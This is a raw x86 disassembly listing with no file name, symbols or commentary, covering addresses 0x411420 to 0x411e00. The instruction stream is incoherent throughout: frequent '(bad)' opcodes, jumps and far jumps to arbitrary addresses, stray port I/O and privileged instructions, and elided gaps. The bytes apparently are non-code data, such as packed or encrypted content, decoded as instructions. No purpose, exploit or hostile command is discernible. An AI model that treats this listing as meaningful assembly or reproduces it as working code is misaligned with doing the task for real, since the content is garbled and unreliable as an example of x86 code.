  411420:	mov    BYTE PTR [esi+esi*2+0x72020fe7],dl
  411427:	(bad)  
  411428:	xchg   edi,eax
  411429:	sbb    bl,BYTE PTR [edi+esi*2-0x5e]
  41142d:	jbe    0x41149f
  41142f:	(bad)  
  411430:	and    BYTE PTR ds:0x29994480,al
  411436:	pop    esp
  411437:	adc    DWORD PTR [esi+0x4d83704e],eax
  41143d:	int    0x13
  41143f:	inc    DWORD PTR [eax]
  411441:	inc    ecx
  411442:	jo     0x411458
  411444:	lea    ecx,[ebx-0x3e]
  411447:	dec    DWORD PTR [edi+0xf737041]
  41144d:	jmp    0x347c:0x44e0ff02
  411454:	or     DWORD PTR [edx-0x3e],ebp
  411457:	dec    DWORD PTR [ebx-0x49]
  41145a:	jo     0x4114d0
  41145c:	xor    eax,0x7aea5996
  411461:	xor    al,0x7d
  411463:	jmp    0x4113eb
  411465:	xor    al,0xfc
  411467:	add    BYTE PTR [eax],0x0
	...
  411486:	cmp    DWORD PTR [ebp+0x4],ebx
  411489:	add    BYTE PTR ds:0xde56da0a,cl
  41148f:	cwde   
  411490:	xor    al,0xf6
  411492:	and    eax,0xa503400
  411497:	outs   dx,DWORD PTR ds:[esi]
  411498:	arpl   WORD PTR [esi+edi*2+0x1a],ax
  41149c:	pop    esi
  41149d:	les    ecx,FWORD PTR [esi]
  41149f:	add    cl,ch
  4114a1:	add    ebx,DWORD PTR ds:0x127cd7f4
  4114a7:	cmp    DWORD PTR [edi],0x24
  4114aa:	pop    edi
  4114ab:	cli    
  4114ac:	imul   edi,DWORD PTR [edx+0x5e],0x4
  4114b0:	repnz add DWORD PTR [ebx+0x2],ebx
  4114b4:	jb     0x41152a
  4114b6:	xchg   edi,eax
  4114b7:	mov    esp,0x4b6b5bf0
  4114bc:	call   0x9380a4c4
  4114c1:	dec    ebp
  4114c2:	mov    DWORD PTR [ebp+0x7b],esi
  4114c5:	pop    es
  4114c6:	fistp  QWORD PTR [edi]
  4114c8:	adc    edi,esi
  4114ca:	and    ch,ch
  4114cc:	in     al,0x3
  4114ce:	and    BYTE PTR ds:0xf3ed326a,al
  4114d4:	xlat   BYTE PTR ds:[ebx]
  4114d5:	jo     0x4114d8
  4114d7:	clc    
  4114d8:	jno    0x4114cb
  4114da:	push   ss
  4114db:	pop    eax
  4114dc:	into   
  4114dd:	dec    edi
  4114de:	jp     0x41154e
  4114e0:	popa   
  4114e1:	dec    ebx
  4114e2:	mov    DWORD PTR [edx+0x3c],ecx
  4114e5:	fs cdq 
  4114e7:	test   al,al
  4114e9:	outs   dx,BYTE PTR ds:[esi]
	...
  411506:	add    BYTE PTR [eax],al
  411508:	arpl   WORD PTR [esi+0x18],bp
  41150b:	fsubr  st(6),st
  41150d:	repz sub BYTE PTR [ebx+ecx*2],al
  411511:	(bad)  
  411512:	cmc    
  411513:	add    esi,DWORD PTR ds:0xd05eb4e
  411519:	test   BYTE PTR [eax+0x39d703f7],ch
  41151f:	jg     0x4114aa
  411521:	xor    DWORD PTR [bx+si+0x2b],0xffffffcf
  411526:	nop
  411527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411528:	push   ss
  411529:	add    al,BYTE PTR [eax]
  41152b:	jmp    0xc4b4c3c2
  411530:	mov    DWORD PTR [eax+eiz*1],ebp
  411533:	mul    BYTE PTR [edx+0x4e970ead]
  411539:	mov    ebp,0x6c666c8c
  41153e:	dec    BYTE PTR [esi-0x22]
  411541:	sub    BYTE PTR gs:[edi+0x5d],al
  411545:	outs   dx,BYTE PTR ds:[esi]
  411546:	xchg   DWORD PTR [ebp+ecx*1+0x6b31847b],esp
  41154d:	outs   dx,BYTE PTR ds:[esi]
  41154e:	(bad)  
  41154f:	cdq    
  411550:	fst    QWORD PTR ss:[edx-0x17]
  411554:	push   cs
  411555:	shl    edi,1
  411557:	push   ss
  411558:	ins    BYTE PTR es:[edi],dx
  411559:	add    BYTE PTR [eax],al
  41155b:	arpl   bx,dx
  41155d:	(bad)  
  41155e:	pop    esi
  41155f:	scas   eax,DWORD PTR es:[edi]
  411560:	sar    DWORD PTR [eax],0xc1
  411563:	icebp  
  411564:	push   cs
  411565:	ror    DWORD PTR [edx-0xca670f3],cl
  41156b:	call   0x411570
	...
  411588:	add    BYTE PTR [eax],al
  41158a:	push   cs
  41158b:	add    BYTE PTR [esi+0x62],dl
  41158e:	fwait
  41158f:	add    eax,0xf106781
  411594:	or     cl,ch
  411596:	push   cs
  411597:	aad    0x73
  411599:	out    dx,al
  41159a:	cmp    al,0x40
  41159c:	call   0x411deb
  4115a1:	xchg   BYTE PTR [ecx],ah
  4115a3:	clc    
  4115a4:	(bad)  
  4115a5:	call   0x1a40ece5
  4115aa:	jmp    0x876d:0x4ed75013
  4115b1:	and    dl,BYTE PTR ds:0x8ff04579
  4115b7:	inc    ecx
  4115b8:	or     esp,DWORD PTR [eax+0x4e]
  4115bb:	stc    
  4115bc:	mov    WORD PTR [edi],fs
  4115be:	or     al,0xd0
  4115c0:	imul   eax,DWORD PTR [eax],0x4b8b3e49
  4115c6:	inc    esp
  4115c7:	jmp    0xffff:0x74fee8c5
  4115ce:	scas   eax,DWORD PTR es:[edi]
  4115cf:	inc    ebp
  4115d0:	xor    eax,0x8b1cb789
  4115d5:	inc    esi
  4115d6:	das    
  4115d7:	jmp    0x41161a
  4115d9:	inc    eax
  4115da:	jno    0x411622
  4115dc:	inc    ebp
  4115dd:	push   eax
  4115de:	into   
  4115df:	sbb    al,0x5f
  4115e1:	lea    ebx,[edi+0x3cc789ac]
  4115e7:	das    
  4115e8:	ja     0x4115eb
  4115ea:	in     al,0xe9
  4115ec:	test   BYTE PTR [edi+0x0],bh
	...
  41160a:	add    BYTE PTR [eax],al
  41160c:	in     al,0x0
  41160e:	add    BYTE PTR [ebx+0x4014acb1],cl
  411614:	mov    ah,0xeb
  411616:	add    esp,0x6a0000a4
  41161c:	mov    ah,0x7f
  41161e:	test   bl,al
  411620:	mov    ah,0x0
  411622:	add    BYTE PTR [eax+0x31],dl
  411625:	add    esi,0x5000a400
  41162b:	(bad)  
  41162c:	sti    
  41162d:	add    dl,0xc
  411630:	fadd   QWORD PTR [ecx]
  411632:	add    DWORD PTR [eax],eax
  411634:	je     0x4116b5
  411636:	test   bl,dl
  411638:	add    BYTE PTR fs:[eax],al
  41163b:	push   eax
  41163c:	rol    DWORD PTR [ecx+0x7400d6],1
  411642:	push   eax
  411643:	(bad)  
  411644:	jnp    0x4115c7
  411646:	ret    0xe30c
  411649:	add    al,0x1
  41164b:	add    BYTE PTR [ebx+eax*4-0x3c],ah
  41164f:	aad    0x35
  411651:	add    BYTE PTR [eax],al
  411653:	push   esi
  411654:	mov    cl,0xe9
  411656:	fiadd  DWORD PTR [ecx]
  411658:	or     eax,0x4a8b0257
  41165d:	jle    0x4116c6
  41165f:	jne    0x41166d
  411661:	push   edi
  411662:	xchg   DWORD PTR [edi-0x12d1bee],edi
  411668:	sbb    dh,ch
  41166a:	fadd   DWORD PTR [eax]
  41166c:	xor    BYTE PTR [ebx],0x13
  41166f:	inc    BYTE PTR [eax]
	...
  41168d:	add    BYTE PTR [edx],cl
  41168f:	jecxz  0x4116eb
  411691:	arpl   WORD PTR ds:[ecx+0x2],bx
  411695:	mov    edx,ebx
  411697:	test   eax,0x57245f5a
  41169c:	add    al,BYTE PTR [ebp+ecx*8-0xc46ee54]
  4116a3:	pop    eax
  4116a4:	add    al,BYTE PTR [eax]
  4116a6:	xchg   BYTE PTR [ebx],bl
  4116a8:	inc    ebp
  4116a9:	call   edx
  4116ab:	cdq    
  4116ac:	mov    ebx,0x2710c474
  4116b1:	inc    edx
  4116b3:	or     dl,dh
  4116b5:	mov    WORD PTR [eax+0x17],ss
  4116b8:	ror    DWORD PTR [esi+edi*2+0xd000211],cl
  4116bf:	pop    DWORD PTR [edx]
  4116c1:	adc    ebp,0x6a
  4116c4:	pop    ecx
  4116c5:	mov    ebp,0x8502587e
  4116ca:	int    0xda
  4116cc:	adc    eax,0x2587bb9
  4116d1:	add    BYTE PTR [eax+0x7afe13e4],dl
  4116d7:	push   edx
  4116d8:	inc    ebp
  4116d9:	push   DWORD PTR [edx+0x19]
  4116dc:	mov    ebx,0x77506474
  4116e1:	std    
  4116e2:	bound  ebp,QWORD PTR [edx-0x1fc4bb88]
  4116e8:	add    BYTE PTR [edi],0xb
  4116eb:	pop    ecx
  4116ec:	add    ch,BYTE PTR [edx+0x15]
  4116ef:	add    BYTE PTR [edi+eax*8+0x0],dh
	...
  41170f:	add    BYTE PTR [eax-0x30],bl
  411712:	imul   eax,DWORD PTR [ecx+0x3e9053a],0xffffffdd
  411719:	push   0xfffffff3
  41171b:	mov    edi,0x80e8c000
  411720:	dec    esi
  411721:	cld    
  411722:	aas    
  411723:	pop    esi
  411724:	or     eax,0x897ee900
  411729:	adc    BYTE PTR [edi+0x6d],ch
  41172c:	or     eax,DWORD PTR [edx-0x18]
  41172f:	add    ecx,DWORD PTR [ebp-0x47]
  411732:	shr    DWORD PTR [edx-0x79],cl
  411735:	hlt    
  411736:	loopne 0x4117b6
  411738:	mov    BYTE PTR [ebx+eiz*8+0x3],ah
  41173c:	or     eax,0xfe7973d0
  411741:	add    ecx,ebp
  411743:	add    eax,DWORD PTR [esi+0x5b2b4042]
  411749:	add    ecx,ebp
  41174b:	xchg   BYTE PTR [edx-0x3f579406],cl
  411751:	push   0x1d
  411753:	jns    0x4116e5
  411755:	ins    BYTE PTR es:[edi],dx
  411756:	in     eax,dx
  411757:	add    ecx,DWORD PTR ds:0x15106979
  41175d:	add    cl,ch
  41175f:	mov    bl,0xd
  411761:	retf   
  411762:	sahf   
  411763:	cmp    cl,ah
  411765:	add    ebp,ecx
  411767:	xor    ch,cl
  411769:	es sbb eax,edi
  41176c:	hlt    
  41176d:	cli    
  41176e:	popf   
  41176f:	stc    
  411770:	call   0x138c89b
	...
  411791:	add    ah,ch
  411793:	rcr    DWORD PTR [ecx],1
  411795:	jbe    0x411726
  411797:	push   0xfafff718
  41179c:	jge    0x411757
  41179e:	or     al,0x7f
  4117a0:	mov    edi,0x4deeb
  4117a5:	push   0xffffffe7
  4117a7:	shl    BYTE PTR [esp+eiz*8+0x64],cl
  4117ab:	(bad)  
  4117ac:	push   edi
  4117ad:	jmp    0x7b34:0x560ecdde
  4117b4:	pop    eax
  4117b5:	mov    ecx,0xe0fa7d28
  4117ba:	and    DWORD PTR [edx],eax
  4117bc:	add    edi,DWORD PTR [edi-0x5d]
  4117bf:	out    dx,al
  4117c0:	lock cdq 
  4117c2:	mov    ch,0xa
  4117c4:	lea    edx,[eax]
  4117c6:	pusha  
  4117c7:	in     al,0x82
  4117c9:	jb     0x4117de
  4117cb:	icebp  
  4117cc:	pop    es
  4117cd:	jmp    0x5637:0x58737c78
  4117d4:	push   cs
  4117d5:	fs (bad) 
  4117d7:	mov    ah,BYTE PTR [ebp+0x6a]
  4117da:	jne    0x4117e0
  4117dc:	ja     0x4117d0
  4117de:	or     eax,0x5fb58c72
  4117e3:	cwde   
  4117e4:	sub    BYTE PTR [ebx],0xc
  4117e7:	push   ebp
  4117e8:	(bad)  
  4117e9:	xchg   edx,eax
  4117ea:	mov    al,0x84
  4117ec:	enter  0xd9d,0x7d
  4117f0:	(bad)  
  4117f1:	call   0x2a9f4a2d
	...
  411812:	add    BYTE PTR [eax],al
  411814:	aam    0x1
  411816:	mov    esi,esp
  411818:	(bad)  
  411819:	ds imul esi,ebp,0xaa7489c6
  411820:	push   cs
  411821:	pop    eax
  411822:	fs dec ecx
  411824:	or     al,0x0
  411826:	xor    esi,edi
  411828:	sub    al,0xf3
  41182a:	sti    
  41182b:	jb     0x411878
  41182d:	and    eax,0xb276ab03
  411832:	inc    edi
  411833:	std    
  411834:	cmc    
  411835:	mov    ah,0x0
  411837:	icebp  
  411838:	addr16 mov dl,0x3f
  41183b:	add    BYTE PTR [edx+0x5f],dh
  41183e:	add    eax,0x20
  411841:	and    DWORD PTR [edx+0x2],ebp
  411844:	sti    
  411845:	pop    ebp
  411846:	cmp    eax,edi
  411848:	pop    es
  411849:	stc    
  41184a:	mov    dh,BYTE PTR [ecx-0x38]
  41184d:	add    dl,dh
  41184f:	mov    DWORD PTR [ecx],esp
  411851:	loopne 0x411850
  411853:	jno    0x411851
  411855:	dec    ebp
  411856:	std    
  411857:	adc    eax,0x401218
  41185c:	mov    cl,0xc3
  41185e:	jb     0x411865
  411860:	push   edi
  411861:	out    dx,eax
  411862:	xchg   DWORD PTR [ebp-0x80],esi
  411865:	or     DWORD PTR [ebx-0x4],0xebc4e97b
  41186c:	stc    
  41186d:	xor    eax,eax
  41186f:	inc    eax
  411870:	daa    
  411871:	jmp    0xa7a900d9
  411876:	cli    
  411877:	inc    DWORD PTR [eax]
	...
  411895:	add    BYTE PTR [edi],al
  411897:	(bad)  
  411898:	out    0x48,al
  41189a:	xchg   esp,eax
  41189b:	add    DWORD PTR [eax],eax
  41189d:	ret    
  41189e:	mov    esi,0x9190680c
  4118a3:	inc    ecx
  4118a4:	(bad)  
  4118a5:	out    0xb4,eax
  4118a7:	pushf  
  4118a8:	add    BYTE PTR [eax],al
  4118aa:	aas    
  4118ab:	aas    
  4118ac:	push   cs
  4118ad:	mov    edx,DWORD PTR [esi]
  4118af:	jmp    0x5f68212f
  4118b4:	cli    
  4118b5:	add    BYTE PTR [edi],ch
  4118b7:	push   ebx
  4118b8:	cmp    al,BYTE PTR [ebx+0xa26a48]
  4118be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118bf:	cld    
  4118c0:	dec    DWORD PTR [esi]
  4118c2:	and    BYTE PTR [esi-0x2],dh
  4118c5:	push   DWORD PTR [ecx+ebp*8-0x66]
  4118c9:	or     dl,BYTE PTR [esp+edi*8+0x37fdffff]
  4118d0:	push   cs
  4118d1:	test   DWORD PTR ds:0x9983f9ae,ecx
  4118d7:	push   esi
  4118d8:	add    al,BYTE PTR [eax]
  4118da:	xchg   esi,eax
  4118db:	and    edi,eax
  4118dd:	add    dh,BYTE PTR [edi+ebp*8]
  4118e0:	mov    DWORD PTR [edi],0xf7035280
  4118e6:	gs dec ebp
  4118e8:	inc    edx
  4118e9:	and    cl,BYTE PTR [esi-0x13]
  4118ec:	into   
  4118ed:	or     DWORD PTR [ecx],eax
  4118ef:	dec    esi
  4118f0:	je     0x41191c
  4118f2:	aaa    
  4118f3:	(bad)  
  4118f5:	or     edx,DWORD PTR [esi+0x3141b]
	...
  411917:	add    BYTE PTR [edi+ebp*8-0x39],al
  41191b:	fisttp WORD PTR [esi-0x468bfdc3]
  411921:	fst    st(5)
  411923:	add    ecx,DWORD PTR [esi+0x4a71faf3]
  411929:	in     al,dx
  41192a:	in     al,dx
  41192b:	neg    esp
  41192d:	mov    dh,0x7b
  41192f:	jl     0x41194e
  411931:	fcmovu st,st(7)
  411933:	jecxz  0x411942
  411935:	loop   0x411906
  411937:	jecxz  0x41195f
  411939:	push   es
  41193a:	div    BYTE PTR [ebx]
  41193c:	or     ch,dh
  41193e:	into   
  41193f:	push   edx
  411940:	add    eax,0x41d17f37
  411945:	cld    
  411946:	test   cl,ah
  411948:	ret    0x26e
  41194b:	add    BYTE PTR [esi],cl
  41194d:	push   0x5
  41194f:	shl    esi,1
  411951:	mov    ds:0xdc0371fa,eax
  411956:	inc    edx
  411957:	jae    0x411962
  411959:	inc    edx
  41195a:	push   edx
  41195b:	jbe    0x411968
  41195d:	repnz out 0xb,eax
  411960:	in     al,0xb2
  411962:	jge    0x41199d
  411964:	push   cs
  411965:	push   edi
  411966:	jp     0x4119a1
  411968:	xchg   esi,eax
  411969:	add    BYTE PTR [esp+edx*1+0x7a],ah
  41196d:	mov    ebp,0x3495dc4
  411972:	xor    al,BYTE PTR [eax]
  411974:	jbe    0x411912
  411976:	imul   esi,DWORD PTR [edi+0x3786766],0x0
	...
  411998:	add    BYTE PTR [eax],al
  41199a:	data16 cmc 
  41199c:	stc    
  41199d:	inc    ebx
  41199e:	adc    al,BYTE PTR [ebx+0x61]
  4119a1:	fbstp  TBYTE PTR [edx]
  4119a3:	sbb    DWORD PTR [ebx],0x68
  4119a6:	inc    ebx
  4119a7:	xor    ch,BYTE PTR [ecx-0x15793ea4]
  4119ad:	add    ecx,DWORD PTR [edi-0xc]
  4119b0:	call   0xa9191892
  4119b5:	out    dx,eax
  4119b6:	iret   
  4119b7:	call   DWORD PTR [eax-0x16fd85e3]
  4119bd:	jl     0x4119dc
  4119bf:	xor    edx,DWORD PTR [edx+0x6164697b]
  4119c5:	ret    0x7b46
  4119c8:	in     al,0x33
  4119ca:	pop    ebp
  4119cb:	js     0x411988
  4119cd:	pusha  
  4119ce:	fs rol al,0x3
  4119d2:	sbb    eax,0x3fd0e900
  4119d7:	addr16 mov ebx,0xb50cdbfb
  4119dd:	adc    eax,0xbf60004d
  4119e2:	jmp    0xbecf:0x67f02a2a
  4119e9:	pop    ebx
  4119ea:	mov    bl,0x9a
  4119ec:	out    0x3,eax
  4119ee:	xchg   BYTE PTR [edi],dh
  4119f0:	pop    edi
  4119f1:	mov    bh,0xc6
  4119f3:	sub    ah,BYTE PTR [edx]
  4119f5:	lock fst st(2)
  4119f8:	cdq    
  4119f9:	rol    DWORD PTR [edi+0x5c08cc],1
	...
  411a1b:	add    BYTE PTR [ebp+eiz*2-0x7d0a0a01],dh
  411a22:	mov    edi,0x56d31075
  411a27:	out    0x6b,al
  411a29:	dec    edx
  411a2a:	(bad)  
  411a2b:	push   esp
  411a2c:	jmp    0xf6228e96
  411a31:	or     ebp,DWORD PTR [ebx+edi*8+0x4e]
  411a35:	data16 cmc 
  411a37:	mov    eax,ds:0xa1f64009
  411a3c:	(bad)  
  411a3d:	mov    ebx,0x4a3bb6e6
  411a42:	out    0xee,eax
  411a44:	mov    eax,ds:0x53e0ffff
  411a49:	pop    ebp
  411a4a:	je     0x411a40
  411a4c:	push   esi
  411a4d:	data16 jle 0x411a39
  411a50:	push   cs
  411a51:	sar    esi,cl
  411a53:	adc    al,0xa9
  411a55:	gs je  0x411a49
  411a58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a59:	or     edi,DWORD PTR [eax-0x25]
  411a5c:	dec    esi
  411a5d:	xchg   WORD PTR [ecx+esi*2],dx
  411a61:	or     BYTE PTR [ebp+ebp*2+0x75],0x7a
  411a66:	inc    esp
  411a67:	dec    ecx
  411a68:	pop    ecx
  411a69:	hlt    
  411a6a:	xor    ch,BYTE PTR [ecx]
  411a6c:	into   
  411a6d:	inc    edx
  411a6e:	mov    cl,ah
  411a70:	inc    esi
  411a71:	or     BYTE PTR [ebp+ecx*2+0x75],0x32
  411a76:	rcl    BYTE PTR [ecx+0x4c],0x83
  411a7a:	add    ecx,ebp
  411a7c:	dec    eax
  411a7d:	add    DWORD PTR [eax],eax
  411a7f:	ret    
	...
  411a9c:	add    BYTE PTR [eax],al
  411a9e:	push   ss
  411a9f:	fdivr  DWORD PTR [edi-0x4c]
  411aa2:	leave  
  411aa3:	gs out 0xa5,al
  411aa6:	test   bh,bh
  411aa8:	push   DWORD PTR [ecx+0x27]
  411aab:	and    BYTE PTR [ebp+edx*1+0xe],0x79
  411ab0:	inc    esi
  411ab1:	int    0x9
  411ab3:	cmp    eax,0x80fc0082
  411ab8:	mov    DWORD PTR [eax],esi
  411aba:	sub    edi,ebp
  411abc:	jb     0x411b1f
  411abe:	neg    DWORD PTR [eax+0x2]
  411ac1:	adc    al,0xfa
  411ac3:	xor    eax,DWORD PTR [ecx]
  411ac5:	idiv   ebp
  411ac7:	outs   dx,BYTE PTR ds:[esi]
  411ac8:	(bad)  
  411ac9:	adc    DWORD PTR [edx],0xfffffffc
  411acc:	jae    0x411b1f
  411ace:	out    dx,eax
  411acf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ad0:	or     al,BYTE PTR [ebx]
  411ad2:	stos   DWORD PTR es:[edi],eax
  411ad3:	dec    esp
  411ad4:	std    
  411ad5:	push   ebp
  411ad6:	pop    esp
  411ad7:	in     al,0x43
  411ad9:	loopne 0x411ac4
  411adb:	mov    ebx,0xfdaf5072
  411ae0:	add    bl,bh
  411ae2:	scas   eax,DWORD PTR es:[edi]
  411ae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ae4:	push   cs
  411ae5:	add    ebp,DWORD PTR [ebx-0x1d]
  411ae8:	inc    ebx
  411ae9:	in     al,0xbd
  411aeb:	fimul  DWORD PTR ss:[ebx+0x74be8037]
  411af2:	dec    ebx
  411af3:	push   esp
  411af4:	add    eax,0xfedd9325
  411af9:	(bad)  
  411afa:	jg     0x411afb
  411afc:	add    al,bh
  411afe:	ja     0x411abc
  411b00:	add    BYTE PTR [eax+0x0],dl
	...
  411b1f:	add    BYTE PTR [ebx+0x6f],dh
  411b22:	fdivp  st(7),st
  411b24:	mov    ecx,0xd8c0836c
  411b29:	push   ds
  411b2a:	mov    ecx,DWORD PTR [ebp+0x58]
  411b2d:	jecxz  0x411b2e
  411b2f:	xor    BYTE PTR [edi],0x0
  411b32:	add    DWORD PTR [ebp+0x48],0x0
  411b36:	jmp    0x411b08
  411b38:	addr16 es adc ebp,ebx
  411b3c:	fwait
  411b3d:	or     BYTE PTR [ebx-0x4],0xf3
  411b41:	stos   DWORD PTR es:[edi],eax
  411b42:	(bad)  
  411b43:	jmp    0xe8e7:0x40c031c1
  411b4a:	arpl   ax,bp
  411b4c:	or     eax,0xa2fbb8da
  411b51:	dec    eax
  411b52:	inc    edx
  411b53:	out    0xe5,eax
  411b55:	fadd   QWORD PTR [ecx]
  411b57:	add    bh,cl
  411b59:	outs   dx,BYTE PTR ds:[esi]
  411b5a:	add    ch,BYTE PTR [edx+0x25]
  411b5d:	jg     0x411b51
  411b5f:	je     0x411b2f
  411b61:	push   esi
  411b62:	pop    edx
  411b63:	fstp   QWORD PTR [eax+0x56330258]
  411b69:	out    dx,al
  411b6a:	(bad)  
  411b6b:	out    0x94,al
  411b6d:	sub    ebp,DWORD PTR [eax-0x76]
  411b70:	int3   
  411b71:	bnd jp 0x411b07
  411b74:	add    eax,0xd0002d7
  411b79:	add    dl,BYTE PTR [ebx+0x75]
  411b7c:	fstp   st(1)
  411b7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b7f:	pop    es
  411b80:	mov    DWORD PTR [esi+0x2],edx
	...
  411b9f:	add    BYTE PTR [eax],al
  411ba1:	add    BYTE PTR [ecx],ah
  411ba3:	add    eax,0x70f98cbe
  411ba8:	jnp    0x411c1e
  411baa:	inc    ebp
  411bab:	loope  0x411ba9
  411bad:	cmp    cl,BYTE PTR [esi+0xa]
  411bb0:	sub    cl,BYTE PTR [ebp+0x45796ed9]
  411bb6:	std    
  411bb7:	pop    ecx
  411bb8:	inc    ebx
  411bb9:	mov    BYTE PTR [eax-0x73],dl
  411bbc:	jnp    0x411c3a
  411bbe:	in     eax,dx
  411bbf:	mov    al,0x5
  411bc1:	je     0x411bd8
  411bc3:	out    dx,al
  411bc4:	iret   
  411bc5:	pop    es
  411bc6:	ss imul ebp,edi,0xf6a49608
  411bcd:	mov    ch,bh
  411bcf:	sbb    al,al
  411bd1:	out    0xc,al
  411bd3:	(bad)  
  411bd4:	cmp    eax,0xff198e03
  411bd9:	jmp    0x21b6:0x133cd6eb
  411be0:	xor    al,al
  411be2:	dec    ebp
  411be3:	add    BYTE PTR [edx],ch
  411be5:	jp     0x411c10
  411be7:	pop    eax
  411be8:	shl    BYTE PTR es:[ebx-0x59479600],0x63
  411bf0:	(bad)  
  411bf1:	shl    BYTE PTR [ebx+0xc884d58],0x0
  411bf8:	sub    edi,ebx
  411bfa:	mov    cl,ch
  411bfc:	popa   
  411bfd:	out    dx,eax
  411bfe:	cs clc 
  411c00:	xchg   ebp,eax
  411c01:	jp     0x411c77
  411c03:	ja     0x411c3d
  411c05:	clc    
	...
  411c22:	add    BYTE PTR [eax],al
  411c24:	xchg   DWORD PTR [ebx+ebx*4],ecx
  411c27:	jns    0x411c23
  411c29:	xlat   BYTE PTR ds:[ebx]
  411c2a:	jmp    0x3d11b3a0
  411c2f:	sbb    DWORD PTR [edi+eiz*1],edi
  411c32:	ret    
  411c33:	out    0xe,al
  411c35:	das    
  411c36:	test   eax,0x2c69f459
  411c3b:	and    BYTE PTR ds:0xfcf01a01,bl
  411c41:	jl     0x411be8
  411c43:	out    0x14,al
  411c45:	ja     0x411c6f
  411c47:	xor    al,0xf6
  411c49:	jo     0x411c30
  411c4b:	lods   eax,DWORD PTR ds:[esi]
  411c4c:	add    eax,0xb1056f3
  411c51:	jbe    0x411c37
  411c53:	add    dl,al
  411c55:	rol    al,0x7
  411c58:	paddsw mm2,mm6
  411c5b:	jle    0x411c60
  411c5d:	jecxz  0x411be0
  411c5f:	xor    ebp,ecx
  411c61:	mov    edi,0x3e50c4c1
  411c66:	lock add edx,DWORD PTR [edi+0x53fe6310]
  411c6d:	shl    DWORD PTR [esi-0x111330d7],0x7e
  411c74:	shl    edx,cl
  411c76:	aaa    
  411c77:	pop    ecx
  411c78:	mov    al,0x2e
  411c7a:	add    BYTE PTR [ecx],ch
  411c7c:	fs pop esp
  411c7e:	push   esp
  411c7f:	bound  edx,QWORD PTR [ebp-0x80]
  411c82:	jmp    0x411c81
  411c84:	sldt   WORD PTR [eax]
  411c87:	mov    edx,0x0
	...
  411ca4:	add    BYTE PTR [eax],al
  411ca6:	fdiv   DWORD PTR [ebp+0x74]
  411ca9:	std    
  411caa:	shl    DWORD PTR [ebp-0x7],1
  411cad:	bound  eax,QWORD PTR [esi+0x58]
  411cb0:	sub    esp,esi
  411cb2:	push   cs
  411cb3:	add    BYTE PTR [ebx+0x46272aa4],cl
  411cb9:	loope  0x411d34
  411cbb:	jge    0x411cf0
  411cbd:	into   
  411cbe:	push   cs
  411cbf:	add    dh,dh
  411cc1:	sub    al,0x29
  411cc3:	dec    BYTE PTR [edx+0x44791924]
  411cc9:	shl    DWORD PTR [edx-0xf],0x8a
  411ccd:	and    al,0x5
  411ccf:	jns    0x411d15
  411cd1:	mov    cl,0xdb
  411cd3:	mov    ebx,0x365370c7
  411cd8:	mov    BYTE PTR [edx*1+0x5b6a0e76],ch
  411cdf:	push   edx
  411ce0:	jmp    FWORD PTR [ecx+0x53]
  411ce3:	push   esi
  411ce4:	(bad)  
  411ce5:	in     eax,dx
  411ce6:	js     0x411d27
  411ce8:	mov    BYTE PTR [esi*4+0x2017f77d],ch
  411cef:	jns    0x411c9d
  411cf1:	ror    BYTE PTR [esi],1
  411cf3:	add    BYTE PTR [edi],cl
  411cf5:	aaa    
  411cf6:	sahf   
  411cf7:	xchg   esi,eax
  411cf8:	add    DWORD PTR [eax],ebp
  411cfa:	or     DWORD PTR [ecx+0x23],esp
  411cfd:	push   esp
  411cfe:	lea    eax,[eax]
  411d00:	inc    ecx
  411d01:	jmp    0xe887c8ff
  411d06:	loope  0x411cb3
  411d08:	dec    esi
  411d09:	jmp    0x411d0b
	...
  411d27:	add    BYTE PTR [edi+0x41],cl
  411d2a:	pop    es
  411d2b:	loop   0x411d7c
  411d2d:	loope  0x411dad
  411d2f:	add    bh,ah
  411d31:	push   eax
  411d32:	xchg   DWORD PTR [ebp-0x20],eax
  411d35:	ins    BYTE PTR es:[edi],dx
  411d36:	adc    DWORD PTR [ebp-0x7d00024c],0xffffffa9
  411d3d:	sub    eax,0xfda443e5
  411d42:	push   cs
  411d43:	test   BYTE PTR [ecx],dh
  411d45:	std    
  411d46:	(bad)  
  411d47:	jmp    FWORD PTR [ebx+0x2f044593]
  411d4d:	stos   DWORD PTR es:[edi],eax
  411d4e:	push   0xffffff89
  411d50:	popa   
  411d51:	jns    0x411cdc
  411d53:	inc    esi
  411d54:	js     0x411d3c
  411d56:	inc    ebx
  411d57:	mov    al,ds:0x2b66a2ef
  411d5c:	sub    al,0xe6
  411d5e:	dec    ebx
  411d5f:	test   al,0xff
  411d61:	dec    esi
  411d62:	push   es
  411d63:	sub    ebx,DWORD PTR [ebx+esi*2+0x4eeda443]
  411d6a:	stos   BYTE PTR es:[edi],al
  411d6b:	mov    ebp,DWORD PTR [edi-0x2df037ef]
  411d71:	xor    al,0x3
  411d73:	rcl    DWORD PTR [esp+esi*8-0x78],0x4d
  411d78:	les    ecx,FWORD PTR [esi+esi*4]
  411d7b:	dec    edi
  411d7c:	xor    dh,dl
  411d7e:	ror    BYTE PTR [edi],0xd2
  411d81:	dec    esp
  411d82:	push   es
  411d83:	mov    ecx,esi
  411d85:	mov    ebx,0xf4f3b60d
  411d8a:	shl    al,0x0
	...
  411da9:	add    BYTE PTR [edx+esi*8],ch
  411dac:	ror    BYTE PTR [ecx+0x4589b7e1],0xe4
  411db3:	jecxz  0x411dde
  411db5:	ret    0xc3a5
  411db8:	xchg   DWORD PTR [ebp+0x40],eax
  411dbb:	jno    0x411d41
  411dbd:	test   ah,ah
  411dbf:	cld    
  411dc0:	dec    DWORD PTR [eax-0x79767b4f]
  411dc6:	or     eax,0xd0003ef
  411dcb:	(bad)  
  411dcc:	rcl    BYTE PTR [edi+0x7a93ca],1
  411dd2:	or     eax,0x48890257
  411dd7:	jmp    0x411e3b
  411dd9:	adc    al,0xfd
  411ddb:	mov    ebx,0x1689ffc6
  411de0:	adc    ecx,DWORD PTR [edi+0x26c88]
  411de6:	adc    bl,bh
  411de8:	pop    ecx
  411de9:	daa    
  411dea:	or     eax,0xbc68557
  411def:	in     al,dx
  411df0:	mov    edx,0xe291a02
  411df5:	mov    eax,edx
  411df7:	test   ax,di
  411dfa:	repz inc ecx
  411dfc:	xchg   al,ch
  411dfe:	or     al,0x57
  411e00:	add    al,BYTE PTR [ebx-0x7bed469c]
